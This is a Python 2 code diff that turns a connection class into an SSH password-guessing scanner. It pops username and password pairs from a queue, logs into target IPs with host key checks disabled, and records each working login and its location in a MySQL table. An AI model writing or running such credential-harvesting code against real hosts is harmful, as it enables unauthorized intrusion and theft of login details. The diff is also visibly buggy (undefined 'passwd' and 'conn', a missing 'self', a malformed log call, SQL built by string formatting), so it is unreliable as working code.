@@ -7,7 +7,6 @@ import getpass
 
 class Connection:
     def __init__(self, ip, auth_queue, handle):
-        self.new_state(conn_state)
         self.auth_queue = auth_queue
         self.ip = ip
         self.hLog = handle
@@ -15,11 +14,37 @@ class Connection:
         self.child = None
         self.bQuit = False
 
-    def new_state(self, newstate):
-        self._state = newstate
-
     def run(self):
-        self._state._run(self)
+        try: 
+            options = dict(StrictHostKeyChecking="no", UserKnownHostsFile="/dev/null")
+            s = pxssh.pxssh(options)
+            user, pwd = self.auth_queue.pop()
+            s.login(self.ip, user, pwd, login_timeout=10)
+            s.sendline ('uptime')  # run a command  
+            s.prompt()             # match the prompt  
+            print "Got password [%s] %s:%s" % (self.ip, user, passwd)
+            self.write_to_db(self.ip, user, pwd)
+            self.hLog.write("%s.\n", s.before)   # print everything before the propt.  
+            s.logout() 
+        except pxssh.ExceptionPxssh, e:  
+            self.hLog.write("ssh failed on login. error is: %s \n" % str(e))
+        except IndexError:
+            self.bQuit = True
+    
+    def write_to_db(ip, user, pwd):
+        try:
+            db = MySQLdb.connect("localhost", "scanner",
+                                 "scanner", "ssh_data", charset="utf8")
+            cursor = db.cursor()
+            cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (
+                ip, 22, user, passwd, IP.find(ip)))
+            db.commit()
+            print "[report] One result import to database"
+        except:
+            db.rollback()
+        conn.bQuit = True
+        db.close()
+
 
     def exit(self):
         if self.child:
